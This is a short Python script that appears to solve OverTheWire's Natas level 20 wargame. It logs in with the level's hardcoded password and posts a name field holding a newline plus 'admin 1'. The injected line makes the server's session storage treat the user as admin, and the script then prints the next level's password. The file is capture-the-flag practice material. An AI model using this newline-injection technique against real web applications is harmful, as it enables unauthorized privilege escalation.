import requests

# Constants
username = 'natas20'
password = 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH'
user_str = "You are logged in as a regular user."
url = f"http://{username}.natas.labs.overthewire.org/"

s = requests.Session()
s.auth = (username, password)

# By tricking the server to read two lines (see viewable source code),
# it is possible to activate a print function which gives the password.
data = {"name": "a\nadmin 1"}
s.post(url, data=data)

# Request the URL again, the session will remember.
response = s.get(url)

for line in response.iter_lines():
    if "Password" in line.decode():
        print(line.decode().strip()[:-6])
        break
